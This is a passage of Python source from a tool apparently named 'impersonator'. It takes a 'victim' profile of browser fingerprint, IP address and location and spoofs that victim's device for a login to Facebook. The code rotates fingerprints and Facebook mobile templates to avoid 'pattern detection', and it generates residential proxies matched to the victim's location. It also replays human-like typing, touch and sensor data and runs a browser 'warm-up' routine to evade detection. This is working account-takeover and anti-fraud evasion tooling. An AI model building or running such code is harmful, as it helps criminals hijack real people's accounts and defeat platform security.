        profile_data['fingerprint'] = {}
    
    fp = profile_data['fingerprint']
    
    # Validate fingerprint completeness (with graceful degradation)
    is_complete, missing_critical, missing_optional = validate_fingerprint_completeness(fp, strict_mode=strict_fingerprint)
    
    # Validate WebGL consistency
    try:
        validate_webgl_consistency(fp)
    except ValueError as e:
        if strict_fingerprint:
            raise  # Re-raise in strict mode
        print(f"[WARNING] WebGL consistency validation failed: {e}")
    
    # Validate geolocation consistency (if proxy or location data available)
    location_data = profile_data.get('location', {})
    validate_geolocation_consistency(fp, proxy_string=proxy_string, location_data=location_data)
    
    # Validate strict fingerprint before enrichment
    if strict_fingerprint:
        validate_strict_fingerprint(fp)
        print("[SUCCESS] Strict fingerprint validation passed - all required fields present")
        # Skip fingerprint default-filling in strict mode
        # Only normalize formats if needed
    
    # Extract device model from user agent if missing
    if 'deviceModel' not in fp and 'userAgent' in fp:
        ua = fp['userAgent']
        # Try to extract device model from user agent
        # Pattern: Android 14; RMX3930 Build/...
        device_match = re.search(r'Android \d+; ([^;]+) Build/', ua)
        if device_match:
            fp['deviceModel'] = device_match.group(1).strip()
        else:
            # Try alternative pattern
            device_match = re.search(r'\(([^)]+)\)', ua)
            if device_match and 'Android' in device_match.group(1):
                parts = device_match.group(1).split(';')
                if len(parts) > 1:
                    fp['deviceModel'] = parts[1].strip().split(' Build')[0]
    
    # Normalize screenResolution format
    if 'screenResolution' in fp:
        screen_res = fp['screenResolution']
        # Handle different formats: "320x712", "320 x 712", "width:320,height:712"
        if 'x' in screen_res:
            # Already in correct format
            pass
        elif 'width' in screen_res.lower() and 'height' in screen_res.lower():
            # Extract from object format
            width_match = re.search(r'width[:\s]*(\d+)', screen_res, re.I)
            height_match = re.search(r'height[:\s]*(\d+)', screen_res, re.I)
            if width_match and height_match:
                fp['screenResolution'] = f"{width_match.group(1)}x{height_match.group(1)}"
    
    # Normalize deviceMemory (handle "4GB" -> 4)
    if 'deviceMemory' in fp:
        device_mem = fp['deviceMemory']
        if isinstance(device_mem, str):
            # Extract number from "4GB" or "4 GB"
            mem_match = re.search(r'(\d+)', device_mem)
            if mem_match:
                fp['deviceMemory'] = int(mem_match.group(1))
        elif isinstance(device_mem, (int, float)):
            fp['deviceMemory'] = int(device_mem)
    
    # Normalize touchSupport (handle string "2" -> int 2)
    if 'touchSupport' in fp:
        touch = fp['touchSupport']
        if isinstance(touch, str):
            touch_match = re.search(r'(\d+)', touch)
            if touch_match:
                fp['touchSupport'] = int(touch_match.group(1))
        elif isinstance(touch, (int, float)):
            fp['touchSupport'] = int(touch)
    
    # Normalize languages (handle string -> array)
    if 'languages' in fp:
        langs = fp['languages']
        if isinstance(langs, str):
            fp['languages'] = [l.strip() for l in langs.split(',') if l.strip()]
        elif not isinstance(langs, list):
            fp['languages'] = [str(langs)]
    
    # Normalize fonts (handle string -> array)
    if 'fonts' in fp:
        fonts = fp['fonts']
        if isinstance(fonts, str):
            fp['fonts'] = [f.strip() for f in fonts.split(',') if f.strip()]
        elif not isinstance(fonts, list):
            fp['fonts'] = []
    
    # Calculate dependent fields before setting defaults
    screen_res = fp.get('screenResolution', '393x852')
    if 'x' in str(screen_res):
        try:
            screen_width, screen_height = map(int, str(screen_res).split('x'))
        except (ValueError, AttributeError):
            screen_width, screen_height = 393, 852
    else:
        screen_width, screen_height = 393, 852
    
    # Default values for missing fingerprint fields
    fingerprint_defaults = {
        'sessionId': fp.get('sessionId', 'unknown_session'),
        'userAgent': fp.get('userAgent', 'Mozilla/5.0 (Linux; Android 12; V2026 Build/SP1A.210812.003) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/142.0.7444.48 Mobile Safari/537.36'),
        'platform': fp.get('platform', 'Linux armv8l'),
        'screenResolution': screen_res,
        'screenAvailWidth': fp.get('screenAvailWidth', screen_width),
        'screenAvailHeight': fp.get('screenAvailHeight', screen_height),
        'devicePixelRatio': fp.get('devicePixelRatio', 3.0),
        'pixelDepth': fp.get('pixelDepth', 24),
        'colorDepth': fp.get('colorDepth', 24),
        'hardwareConcurrency': fp.get('hardwareConcurrency', 8),
        'deviceMemory': fp.get('deviceMemory', 8),
        'language': fp.get('language', 'en-US'),
        'languages': fp.get('languages', ['en-US']),
        'vendor': fp.get('vendor', 'Google Inc.'),
        'touchSupport': fp.get('touchSupport', 1),
        'maxTouchPoints': fp.get('maxTouchPoints', fp.get('touchSupport', 1)),
        'timezone': fp.get('timezone', 'Asia/Manila'),
        'webGLVendor': fp.get('webGLVendor', 'WebKit'),
        'webGLRenderer': fp.get('webGLRenderer', 'WebKit WebGL'),
        'webGLUnmaskedVendor': fp.get('webGLUnmaskedVendor', fp.get('webGLVendor', 'Google Inc. (ARM)')),
        'webGLUnmaskedRenderer': fp.get('webGLUnmaskedRenderer', fp.get('webGLRenderer', 'ANGLE (ARM)')),
        'canvasFingerprint': fp.get('canvasFingerprint', 'data:image/png;base64,iVBORw0KGgo='),
        'audioFingerprint': fp.get('audioFingerprint', '12345'),
        'batteryLevel': fp.get('batteryLevel', 0.75),
        'batteryCharging': fp.get('batteryCharging', False),
        'batteryDrainRate': fp.get('batteryDrainRate', 0.0001),
        'connectionType': fp.get('connectionType', '4g'),
        'connectionDownlink': fp.get('connectionDownlink', 10),
        'saveData': fp.get('saveData', False),
        'doNotTrack': fp.get('doNotTrack', '1'),
        'cookieEnabled': fp.get('cookieEnabled', True),
        'localStorage': fp.get('localStorage', True),
        'sessionStorage': fp.get('sessionStorage', True),
        'indexedDB': fp.get('indexedDB', True),
        'pluginCount': fp.get('pluginCount', 0),
        'fonts': fp.get('fonts', []),
        'orientationType': fp.get('orientationType', fp.get('orientation', 'portrait-primary')),
        'orientationAngle': fp.get('orientationAngle', 0),
        'deviceModel': fp.get('deviceModel', 'Unknown'),
        'gyroscopeNoise': fp.get('gyroscopeNoise', 0.1),
        'gyroscopeDrift': fp.get('gyroscopeDrift', 0.01),
        'gyroscopeFrequency': fp.get('gyroscopeFrequency', 60),
        'accelerometerNoise': fp.get('accelerometerNoise', 0.1),
        'accelerometerGravity': fp.get('accelerometerGravity', 9.81),
        'accelerometerFrequency': fp.get('accelerometerFrequency', 60),
        'touchPressureRange': fp.get('touchPressureRange', [0.5, 1.0]),
        'touchSizeRange': fp.get('touchSizeRange', [8, 12]),
        'mobileSensors': fp.get('mobileSensors', []),
        'touchPatterns': fp.get('touchPatterns', [])
    }
    
    # Apply defaults (only if field is missing and not in strict mode)
    if not strict_fingerprint:
        for key, default_value in fingerprint_defaults.items():
            if key not in fp:
                fp[key] = default_value
                print(f"[INFO] Added missing field: fingerprint.{key} = {default_value}")
    
    # Ensure location exists
    if 'location' not in profile_data:
        profile_data['location'] = {}
    
    location = profile_data['location']
    
    # Location defaults
    location_defaults = {
        'country': location.get('country', 'PH'),
        'countryCode': location.get('countryCode', location.get('country', 'PH')),
        'region': location.get('region', 'Metro Manila'),
        'city': location.get('city', 'Manila'),
        'zip': location.get('zip', '1000'),
        'asn': location.get('asn', '132199'),
        'isp': location.get('isp', 'Unknown'),
        'lat': location.get('lat', 14.5971),
        'lon': location.get('lon', 120.9798)
    }
    
    # Apply location defaults
    for key, default_value in location_defaults.items():
        if key not in location:
            location[key] = default_value
            print(f"[INFO] Added missing field: location.{key} = {default_value}")
    
    # Ensure ip_address exists
    if 'ip_address' not in profile_data:
        profile_data['ip_address'] = None
        print("[INFO] Added missing field: ip_address = None")
    
    # Ensure behavior exists (optional)
    if 'behavior' not in profile_data:
        profile_data['behavior'] = {}
        print("[INFO] Added missing field: behavior = {}")
    
    print("[SUCCESS] Profile enrichment complete - all required fields present")
    return profile_data


class FingerprintRotationManager:
    """
    Manages fingerprint rotation to prevent pattern detection.
    Tracks fingerprint usage per account and prevents reuse.
    """
    
    def __init__(self, usage_file_path=None):
        """
        Initialize fingerprint rotation manager.
        
        Args:
            usage_file_path: Path to JSON file storing usage data.
                           Default: ~/.impersonator/fingerprint_usage.json
        """
        if usage_file_path is None:
            home_dir = Path.home()
            impersonator_dir = home_dir / '.impersonator'
            impersonator_dir.mkdir(exist_ok=True)
            usage_file_path = impersonator_dir / 'fingerprint_usage.json'
        
        self.usage_file_path = Path(usage_file_path)
        self.max_reuse_per_fingerprint = 3
        self.usage_data = self._load_usage_data()
    
    def _load_usage_data(self):
        """Load usage tracking data from JSON file."""
        if self.usage_file_path.exists():
            try:
                with open(self.usage_file_path, 'r') as f:
                    return json.load(f)
            except (json.JSONDecodeError, IOError) as e:
                print(f"[WARNING] Could not load fingerprint usage data: {e}. Starting fresh.")
                return {}
        return {}
    
    def _save_usage_data(self):
        """Save usage tracking data to JSON file."""
        try:
            self.usage_file_path.parent.mkdir(parents=True, exist_ok=True)
            with open(self.usage_file_path, 'w') as f:
                json.dump(self.usage_data, f, indent=2)
        except IOError as e:
            print(f"[WARNING] Could not save fingerprint usage data: {e}")
    
    def _hash_fingerprint(self, fp: dict):
        """Generate hash for fingerprint based on core properties."""
        # Hash based on core properties that should remain constant
        core_props = {
            'userAgent': fp.get('userAgent', ''),
            'platform': fp.get('platform', ''),
            'screenResolution': fp.get('screenResolution', ''),
            'webGLUnmaskedVendor': fp.get('webGLUnmaskedVendor', ''),
            'webGLUnmaskedRenderer': fp.get('webGLUnmaskedRenderer', ''),
            'canvasFingerprint': fp.get('canvasFingerprint', ''),
            'audioFingerprint': fp.get('audioFingerprint', '')
        }
        core_str = json.dumps(core_props, sort_keys=True)
        return hashlib.sha256(core_str.encode()).hexdigest()[:16]
    
    def get_fingerprint_for_account(self, account_id: str, available_fps: list):
        """
        Select fingerprint with least usage for account.
        
        Args:
            account_id: Account identifier
            available_fps: List of fingerprint dictionaries to choose from
        
        Returns:
            Selected fingerprint dictionary
        """
        if not available_fps:
            raise ValueError("No fingerprints available for rotation")
        
        # Calculate usage for each fingerprint
        fingerprint_scores = []
        for fp in available_fps:
            fp_hash = self._hash_fingerprint(fp)
            usage_count = len(self.usage_data.get(fp_hash, {}).get('accounts', []))
            
            # Check if this fingerprint is already used by this account
            is_used_by_account = account_id in self.usage_data.get(fp_hash, {}).get('accounts', [])
            
            fingerprint_scores.append({
                'fingerprint': fp,
                'hash': fp_hash,
                'usage_count': usage_count,
                'is_used_by_account': is_used_by_account,
                'score': usage_count + (100 if is_used_by_account else 0)  # Penalize reuse
            })
        
        # Select fingerprint with lowest score (least used)
        selected = min(fingerprint_scores, key=lambda x: x['score'])
        selected_fp = selected['fingerprint']
        selected_hash = selected['hash']
        
        # Check if fingerprint has exceeded max reuse
        if selected['usage_count'] >= self.max_reuse_per_fingerprint:
            print(
                f"[WARNING] Selected fingerprint has been used {selected['usage_count']} times "
                f"(max: {self.max_reuse_per_fingerprint}). Consider creating variation."
            )
        
        # Record usage
        if selected_hash not in self.usage_data:
            self.usage_data[selected_hash] = {'accounts': [], 'first_used': datetime.now().isoformat()}
        
        if account_id not in self.usage_data[selected_hash]['accounts']:
            self.usage_data[selected_hash]['accounts'].append(account_id)
            self.usage_data[selected_hash]['last_used'] = datetime.now().isoformat()
            self._save_usage_data()
            print(f"[INFO] Fingerprint rotation: Selected fingerprint for account {account_id} (usage: {selected['usage_count'] + 1})")
        
        return selected_fp
    
    def create_fingerprint_variation(self, base_fp: dict):
        """
        Create minor variation while maintaining core consistency.
        
        Args:
            base_fp: Base fingerprint dictionary
        
        Returns:
            Varied fingerprint dictionary
        """
        variation = base_fp.copy()
        
        # Vary non-critical properties
        variation['batteryLevel'] = round(random.uniform(0.3, 0.95), 2)
        variation['connectionDownlink'] = random.choice([5, 10, 15, 20])
        
        # Vary language order (if multiple languages)
        if 'languages' in variation and isinstance(variation['languages'], list) and len(variation['languages']) > 1:
            langs = variation['languages'].copy()
            random.shuffle(langs)
            variation['languages'] = langs
        
        # Keep core properties unchanged:
        # userAgent, platform, screen, webGLUnmaskedVendor, webGLUnmaskedRenderer,
        # canvasFingerprint, audioFingerprint
        
        print("[INFO] Created fingerprint variation (battery, connection, language order varied)")
        return variation
    
    def get_usage_stats(self):
        """Get usage statistics for all fingerprints."""
        stats = {
            'total_fingerprints': len(self.usage_data),
            'fingerprints': {}
        }
        
        for fp_hash, data in self.usage_data.items():
            stats['fingerprints'][fp_hash] = {
                'usage_count': len(data.get('accounts', [])),
                'accounts': data.get('accounts', []),
                'first_used': data.get('first_used', 'unknown'),
                'last_used': data.get('last_used', 'unknown')
            }
        
        return stats


class TemplateRotationManager:
    """
    Manages template rotation to prevent pattern detection.
    Maintains library of validated Facebook mobile templates.
    """
    
    def __init__(self, template_file_path=None, usage_file_path=None):
        """
        Initialize template rotation manager.
        
        Args:
            template_file_path: Path to template library JSON file.
                               Default: ~/.impersonator/templates/facebook_mobile_templates.json
            usage_file_path: Path to template usage tracking JSON file.
                            Default: ~/.impersonator/template_usage.json
        """
        home_dir = Path.home()
        impersonator_dir = home_dir / '.impersonator'
        impersonator_dir.mkdir(exist_ok=True)
        
        if template_file_path is None:
            template_dir = impersonator_dir / 'templates'
            template_dir.mkdir(exist_ok=True)
            template_file_path = template_dir / 'facebook_mobile_templates.json'
        
        if usage_file_path is None:
            usage_file_path = impersonator_dir / 'template_usage.json'
        
        self.template_file_path = Path(template_file_path)
        self.usage_file_path = Path(usage_file_path)
        self.templates = self._load_templates()
        self.usage_data = self._load_usage_data()
    
    def _load_templates(self):
        """Load template library from JSON file."""
        if self.template_file_path.exists():
            try:
                with open(self.template_file_path, 'r') as f:
                    data = json.load(f)
                    return data.get('templates', [])
            except (json.JSONDecodeError, IOError) as e:
                print(f"[WARNING] Could not load template library: {e}")
                return []
        return []
    
    def _load_usage_data(self):
        """Load template usage tracking data."""
        if self.usage_file_path.exists():
            try:
                with open(self.usage_file_path, 'r') as f:
                    return json.load(f)
            except (json.JSONDecodeError, IOError) as e:
                print(f"[WARNING] Could not load template usage data: {e}")
                return {}
        return {}
    
    def _save_usage_data(self):
        """Save template usage tracking data."""
        try:
            self.usage_file_path.parent.mkdir(parents=True, exist_ok=True)
            with open(self.usage_file_path, 'w') as f:
                json.dump(self.usage_data, f, indent=2)
        except IOError as e:
            print(f"[WARNING] Could not save template usage data: {e}")
    
    def get_template_for_account(self, account_id: str):
        """
        Select least-used template for account.
        
        Args:
            account_id: Account identifier
        
        Returns:
            Selected template dictionary (with 'fingerprint' key)
        """
        if not self.templates:
            raise ValueError("No templates available. Create template library first.")
        
        # Calculate usage for each template
        template_scores = []
        for template in self.templates:
            template_id = template.get('id', 'unknown')
            usage_count = len(self.usage_data.get(template_id, {}).get('accounts', []))
            is_used_by_account = account_id in self.usage_data.get(template_id, {}).get('accounts', [])
            
            template_scores.append({
                'template': template,
                'id': template_id,
                'usage_count': usage_count,
                'is_used_by_account': is_used_by_account,
                'score': usage_count + (100 if is_used_by_account else 0)
            })
        
        # Select template with lowest score
        selected = min(template_scores, key=lambda x: x['score'])
        selected_template = selected['template']
        selected_id = selected['id']
        
        # Record usage
        if selected_id not in self.usage_data:
            self.usage_data[selected_id] = {'accounts': [], 'first_used': datetime.now().isoformat()}
        
        if account_id not in self.usage_data[selected_id]['accounts']:
            self.usage_data[selected_id]['accounts'].append(account_id)
            self.usage_data[selected_id]['last_used'] = datetime.now().isoformat()
            self._save_usage_data()
            print(f"[INFO] Template rotation: Selected template '{selected_id}' for account {account_id} (usage: {selected['usage_count'] + 1})")
        
        return selected_template
    
    def add_template(self, template: dict):
        """
        Add new template to library.
        
        Args:
            template: Template dictionary with 'id', 'device', 'fingerprint', etc.
        """
        if 'id' not in template:
            raise ValueError("Template must have 'id' field")
        
        # Check if template already exists
        existing_ids = [t.get('id') for t in self.templates]
        if template['id'] in existing_ids:
            print(f"[WARNING] Template '{template['id']}' already exists. Updating...")
            # Update existing template
            for i, t in enumerate(self.templates):
                if t.get('id') == template['id']:
                    self.templates[i] = template
                    break
        else:
            self.templates.append(template)
        
        # Save templates
        try:
            self.template_file_path.parent.mkdir(parents=True, exist_ok=True)
            with open(self.template_file_path, 'w') as f:
                json.dump({'templates': self.templates}, f, indent=2)
            print(f"[SUCCESS] Template '{template['id']}' saved to library")
        except IOError as e:
            print(f"[ERROR] Could not save template: {e}")


def get_latest_chrome_version():
    """
    Get latest stable Chrome version.
    
    Returns:
        str: Chrome version string (e.g., "120.0.0.0") or None if failed
    """
    try:
        # Try Chrome for Testing API
        response = requests.get('https://googlechromelabs.github.io/chrome-for-testing/last-known-good-versions.json', timeout=5)
        if response.status_code == 200:
            data = response.json()
            stable_version = data.get('channels', {}).get('Stable', {}).get('version', '')
            if stable_version:
                # Extract major version (e.g., "120.0.6099.109" -> "120")
                major_version = stable_version.split('.')[0]
                return f"{major_version}.0.0.0"
    except Exception as e:
        print(f"[WARNING] Could not fetch latest Chrome version: {e}")
    
    return None


def update_template_chrome_version(template: dict, target_version: str = None):
    """
    Update template Chrome version while maintaining consistency.
    
    Args:
        template: Template dictionary
        target_version: Target Chrome version (e.g., "120.0.0.0"). If None, fetches latest.
    
    Returns:
        Updated template dictionary
    """
    if target_version is None:
        target_version = get_latest_chrome_version()
        if not target_version:
            print("[WARNING] Could not determine target Chrome version")
            return template
    
    fp = template.get('fingerprint', {})
    ua = fp.get('userAgent', '')
    
    if not ua:
        print("[WARNING] Template has no userAgent - cannot update Chrome version")
        return template
    
    # Extract major version from target (e.g., "120.0.0.0" -> "120")
    target_major = target_version.split('.')[0]
    
    # Update Chrome version in user agent
    # Pattern: Chrome/120.0.0.0
    updated_ua = re.sub(
        r'Chrome/\d+\.\d+\.\d+\.\d+',
        f'Chrome/{target_version}',
        ua
    )
    
    if updated_ua != ua:
        fp['userAgent'] = updated_ua
        template['fingerprint'] = fp
        print(f"[INFO] Updated template Chrome version to {target_version}")
    else:
        print(f"[WARNING] Could not update Chrome version in user agent: {ua[:50]}...")
    
    return template


def validate_behavioral_data(behavioral_data: dict):
    """
    Validate behavioral data completeness and quality.
    
    Args:
        behavioral_data: Behavioral data dictionary
    
    Returns:
        tuple: (is_valid: bool, missing_required: list, missing_optional: list, message: str)
    """
    required_fields = ['touchPatterns', 'typingSpeed']
    optional_fields = ['mouseMovements', 'mobileSensors', 'accelerometer', 'gyroscope']
    
    missing_required = [field for field in required_fields if field not in behavioral_data or not behavioral_data[field]]
    missing_optional = [field for field in optional_fields if field not in behavioral_data or not behavioral_data[field]]
    
    is_valid = len(missing_required) == 0
    
    if missing_required:
        message = f"Missing required behavioral fields: {', '.join(missing_required)}"
    elif missing_optional:
        message = f"Behavioral data valid but missing optional fields: {', '.join(missing_optional)}"
    else:
        message = "Behavioral data complete"
    
    return is_valid, missing_required, missing_optional, message


def apply_basic_behavioral(driver, behavioral_data: dict):
    """
    Apply Phase 1 basic behavioral layer: typing, touch, mouse patterns.
    
    Args:
        driver: WebDriver instance
        behavioral_data: Behavioral data dictionary
    """
    print("[INFO] Applying Phase 1 basic behavioral layer...")
    
    # Human-like typing speed
    typing_speed = behavioral_data.get('typingSpeed', {'min': 0.05, 'max': 0.2})
    if isinstance(typing_speed, dict):
        min_delay = typing_speed.get('min', HUMAN_TYPE_DELAY_MIN)
        max_delay = typing_speed.get('max', HUMAN_TYPE_DELAY_MAX)
    else:
        min_delay = HUMAN_TYPE_DELAY_MIN
        max_delay = HUMAN_TYPE_DELAY_MAX
    
    # Store typing delays in driver for use in form filling
    driver._behavioral_typing_delays = (min_delay, max_delay)
    
    # Basic touch patterns (if available)
    touch_patterns = behavioral_data.get('touchPatterns', [])
    if touch_patterns:
        print(f"[INFO] Loaded {len(touch_patterns)} touch patterns")
        driver._behavioral_touch_patterns = touch_patterns
    
    # Mouse movement patterns (if desktop)
    mouse_movements = behavioral_data.get('mouseMovements', [])
    if mouse_movements:
        print(f"[INFO] Loaded {len(mouse_movements)} mouse movement patterns")
        driver._behavioral_mouse_movements = mouse_movements
    
    print("[SUCCESS] Phase 1 basic behavioral layer applied")


def apply_advanced_behavioral(driver, behavioral_data: dict):
    """
    Apply Phase 2 advanced behavioral layer: sensors, complex patterns, navigation.
    
    Args:
        driver: WebDriver instance
        behavioral_data: Behavioral data dictionary
    """
    print("[INFO] Applying Phase 2 advanced behavioral layer...")
    
    # Sensor data injection
    mobile_sensors = behavioral_data.get('mobileSensors', [])
    accelerometer = behavioral_data.get('accelerometer', {})
    gyroscope = behavioral_data.get('gyroscope', {})
    
    if mobile_sensors or accelerometer or gyroscope:
        print("[INFO] Sensor data available - will be injected via CDP")
        driver._behavioral_sensors = {
            'mobileSensors': mobile_sensors,
            'accelerometer': accelerometer,
            'gyroscope': gyroscope
        }
    
    # Complex touch pattern replay
    touch_patterns = behavioral_data.get('touchPatterns', [])
    if touch_patterns and len(touch_patterns) > 10:  # Complex patterns
        print(f"[INFO] Complex touch patterns loaded: {len(touch_patterns)} patterns")
        driver._behavioral_complex_touch = touch_patterns
    
    # Navigation patterns
    navigation_patterns = behavioral_data.get('navigationPatterns', [])
    if navigation_patterns:
        print(f"[INFO] Navigation patterns loaded: {len(navigation_patterns)} patterns")
        driver._behavioral_navigation = navigation_patterns
    
    # Session warm-up routines
    warmup_urls = behavioral_data.get('warmupUrls', [])
    if warmup_urls:
        print(f"[INFO] Warm-up URLs configured: {len(warmup_urls)} URLs")
        driver._behavioral_warmup_urls = warmup_urls
    
    print("[SUCCESS] Phase 2 advanced behavioral layer applied")


def apply_behavioral_layer(driver, behavioral_data: dict, phase: int = 1):
    """
    Behavioral layer orchestrator: applies Phase 1 or Phase 2 based on data availability.
    
    Args:
        driver: WebDriver instance
        behavioral_data: Behavioral data dictionary
        phase: Behavioral phase (1=basic, 2=advanced, 0=disabled)
    
    Returns:
        bool: True if behavioral layer applied, False if disabled or data incomplete
    """
    if phase == 0:
        print("[INFO] Behavioral layer disabled")
        return False
    
    if not behavioral_data:
        print("[INFO] No behavioral data available - using fingerprint-only mode")
        return False
    
    # Validate behavioral data
    is_valid, missing_required, missing_optional, message = validate_behavioral_data(behavioral_data)
    
    if not is_valid:
        print(f"[WARNING] Behavioral data incomplete: {message}")
        if phase == 2:
            print("[INFO] Falling back to Phase 1 basic behavioral layer")
            phase = 1
        else:
            print("[INFO] Using fingerprint-only mode")
            return False
    
    # Apply appropriate phase
    if phase == 1:
        apply_basic_behavioral(driver, behavioral_data)
        return True
    elif phase == 2:
        # Try Phase 2, fall back to Phase 1 if data insufficient
        if missing_optional and len(missing_optional) > 2:
            print("[INFO] Advanced behavioral data incomplete - using Phase 1")
            apply_basic_behavioral(driver, behavioral_data)
        else:
            apply_advanced_behavioral(driver, behavioral_data)
            # Also apply basic as foundation
            apply_basic_behavioral(driver, behavioral_data)
        return True
    
    return False


def main(args):
    """Main execution function - Manual login mode (fingerprint setup only)."""
    print("[INFO] Loading target profile from:", args.profile)
    with open(args.profile, 'r') as f:
        profile_data = json.load(f)
    
    # NEW: Auto-generate DataImpulse proxy if credentials provided (before enrichment for geolocation validation)
    proxy_string = args.proxy
    if args.dataimpulse_creds and not proxy_string:
        try:
            username, password = args.dataimpulse_creds.split(':', 1)
            proxy_string = generate_dataimpulse_proxy(profile_data, username, password)
            print("[SUCCESS] DataImpulse proxy auto-generated from victim's location")
        except Exception as e:
            print(f"[ERROR] Failed to generate DataImpulse proxy: {e}")
            print("[INFO] Please check your DataImpulse credentials and sessions.json format")
            return
    
    # Check if template mode is enabled
    template_mode = getattr(args, 'template_mode', False)
    enable_rotation = getattr(args, 'enable_rotation', False)
    behavioral_phase = getattr(args, 'behavioral_phase', 1)
    
    # Template mode: use template instead of victim fingerprint
    if template_mode:
        print("[INFO] Template mode enabled - using template library")
        try:
            template_manager = TemplateRotationManager()
            account_id = profile_data.get('fingerprint', {}).get('sessionId', 'unknown_account')
            template = template_manager.get_template_for_account(account_id)
            # Replace fingerprint with template fingerprint
            profile_data['fingerprint'] = template.get('fingerprint', {})
            print(f"[INFO] Using template: {template.get('id', 'unknown')} - {template.get('device', 'unknown device')}")
        except Exception as e:
            print(f"[ERROR] Template mode failed: {e}")
            print("[INFO] Falling back to victim fingerprint")
            template_mode = False
    
    # Fingerprint rotation (if enabled and multiple fingerprints available)
    if enable_rotation and not template_mode:
        print("[INFO] Fingerprint rotation enabled")
        # Note: This would require multiple fingerprints in profile_data
        # For now, we'll just initialize the manager for future use
        rotation_manager = FingerprintRotationManager()
        # If profile_data has multiple fingerprints, use rotation
        # Otherwise, continue with single fingerprint
    
    # Enrich profile with missing fields (strict mode if --camoufox-strict)
    # Pass proxy_string for geolocation consistency checking
    strict_fingerprint = getattr(args, 'camoufox_strict', False)
    profile_data = enrich_victim_profile(profile_data, strict_fingerprint=strict_fingerprint, proxy_string=proxy_string)
    
    # Store behavioral phase in profile_data for create_driver
    profile_data['_behavioral_phase'] = behavioral_phase
    
    # Validate-only mode: run validations and exit
    if getattr(args, 'validate_only', False):
        print("\n" + "="*60)
        print("[VALIDATION MODE] Running validations only...")
        print("="*60)
        
        fp = profile_data.get('fingerprint', {})
        if not fp:
            print("[ERROR] No fingerprint data found in profile")
            return
        
        # Run all validations
        print("\n[1/3] Fingerprint Completeness Validation...")
        is_complete, missing_critical, missing_optional = validate_fingerprint_completeness(fp, strict_mode=False)
        if is_complete:
            print("[SUCCESS] All critical fields present")
        else:
            print(f"[WARNING] Missing critical fields: {', '.join(missing_critical)}")
        
        print("\n[2/3] WebGL Consistency Validation...")
        try:
            validate_webgl_consistency(fp)
        except ValueError as e:
            print(f"[ERROR] WebGL consistency failed: {e}")
        
        print("\n[3/3] Geolocation Consistency Validation...")
        location_data = profile_data.get('location', {})
        validate_geolocation_consistency(fp, proxy_string=proxy_string, location_data=location_data)
        
        print("\n" + "="*60)
        print("[VALIDATION COMPLETE] All validations finished. Exiting.")
        print("="*60)
        return

    driver = None
    session_id = profile_data.get('fingerprint', {}).get('sessionId', 'unknown_session')
    
    # Extract victim's IP address and location for targeting
    victim_ip = profile_data.get('ip_address')
    victim_location = profile_data.get('location', {})
    
    if not victim_ip:
        print("[WARNING] No victim IP address found in profile data")
        victim_ip = None
    else:
        print(f"[INFO] Target victim IP: {victim_ip}")
    
    if not victim_location:
        print("[WARNING] No victim location data found in profile data")
    else:
        print(f"[INFO] Target victim location: {victim_location}")
    
    try:
        print("[INFO] Starting biometric impersonation (fingerprint setup only)...")
        print("[INFO] Manual login mode - browser will open for you to login manually")
        update_session_status(profile_data, "PROCESSING", "Setting up fingerprint for manual login...")
        
        # Check if Camoufox is requested (either --camoufox or --camoufox-strict)
        use_camoufox = getattr(args, 'camoufox', False) or getattr(args, 'camoufox_strict', False)
        strict_fingerprint = getattr(args, 'camoufox_strict', False)
        
        # If strict mode, validate fingerprint before creating driver
        if strict_fingerprint:
            fp = profile_data.get('fingerprint')
            if fp:
                validate_strict_fingerprint(fp)
                print("[SUCCESS] Strict fingerprint validation passed before driver creation")
        
        driver = create_driver(profile_data, proxy_string, use_camoufox=use_camoufox)

        # --- AUTOMATED PROXY & FINGERPRINT VERIFICATION ---
        print("\n" + "="*20 + " PROXY & FINGERPRINT VERIFICATION " + "="*20)

        if proxy_string and not args.test_mode:
            print("[INFO] Verifying proxy connection is active...")
            try:
                # Use victim location for verification if available
                if victim_ip and victim_location:
                    print(f"[INFO] Verifying proxy location matches victim location")
                    if verify_proxy_ip_matches_victim(driver, victim_ip, victim_location):
                        print(f"[SUCCESS] Proxy location targeting successful")
                    else:
                        print(f"[WARNING] Proxy location doesn't match victim location, but continuing...")
                else:
                    # Fallback to basic proxy verification (multi-endpoint)
                    print("[INFO] No victim IP available, performing basic proxy verification...")
                    proxy_ip = _get_proxy_ip_via_driver(driver)

                    if not proxy_ip:
                        raise ValueError("No IP found in response")

                    print(f"[SUCCESS] Proxy is active. Proxy IP: {proxy_ip}")
            except Exception as e:
                # Special handling for upstream IP-check failures (e.g. 502 Bad Gateway)
                if isinstance(e, RuntimeError) and 'Bad Gateway' in str(e):
                    print(f"[WARNING] IP check service returned 502 Bad Gateway: {e}")
                    print("[WARNING] Could not verify proxy via api.ipify.org. Continuing WITHOUT strict proxy verification.")
                elif args.test_mode:
                    print(f"[TEST MODE] Proxy verification bypassed. Error: {e}")
                else:
                    print(f"--- [FATAL] PROXY FAILED TO CONNECT: {e} ---")
                    print("[INFO] The script will now terminate to protect your real IP address.")
                    raise  # Re-raise to trigger finally block and quit driver
        elif proxy_string and args.test_mode:
            print("[TEST MODE] Skipping automatic proxy IP/location verification (proxy will still be used).")
        else:
            print("[INFO] Skipping proxy verification - no proxy configured.")

        # Fingerprint verification / warm-up
        if not args.test_mode:
            # Fingerprint verification for user review
            print("\n[ACTION] The browser will now open a full fingerprint checker website for your review.")
            print(f"[INFO] Pausing for {FINGERPRINT_VERIFICATION_DELAY} seconds for you to visually check all details...")
            try:
                driver.get("https://whoer.net")
                time.sleep(FINGERPRINT_VERIFICATION_DELAY)
            except Exception as e:
                print(f"[WARNING] Could not load verification site: {e}")
            print("[INFO] Fingerprint verification complete.\n")

            # --- Browser Warm-up Routine to Evade Detection ---
            warmup_sites = [
                "https://www.google.com/search?q=latest+news+philippines",
                "https://m.youtube.com"
            ]
            sites_to_visit = random.sample(warmup_sites, random.randint(1, 2))
            print(f"[INFO] Warming up browser by visiting: {', '.join(sites_to_visit)}")
            for site in sites_to_visit:
                try:
                    driver.get(site)
                    print(f"  - Browsing {site}...")
                    time.sleep(random.uniform(WARMUP_DELAY_MIN, WARMUP_DELAY_MAX))
                except Exception as e:
                    print(f"[WARNING] Failed to visit warmup site {site}: {e}")
            print("[INFO] Warm-up complete.\n")
        else:
            print("[TEST MODE] Skipping automatic fingerprint check sites and warm-up. You can verify details manually.")

        # Navigate to Facebook login page for manual login
        print("="*60)
        print("[SUCCESS] FINGERPRINT SETUP COMPLETE")
        print("="*60)
        print("[INFO] All fingerprint properties have been applied:")
        print("  ✓ User Agent spoofed")
